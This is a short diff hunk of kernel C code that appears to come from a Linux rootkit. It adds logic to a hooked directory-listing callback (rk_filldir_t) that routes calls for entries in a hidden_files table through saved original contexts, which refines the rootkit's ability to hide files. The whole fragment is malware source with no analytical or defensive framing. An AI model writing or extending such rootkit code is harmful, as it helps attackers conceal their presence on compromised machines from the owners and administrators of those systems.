@@ -619,6 +619,11 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
         }
     }
 #endif
+    for (i = 0; i < hidden_file_count; ++i) {
+        if (ctx == &hidden_files[i].bad_ctx) {
+            return hidden_files[i].backup_ctx->actor(hidden_files[i].backup_ctx, proc_name, len, off, ino, d_type);
+        }
+    }
     return ctx->actor(ctx, proc_name, len, off, ino, d_type);
 }
 
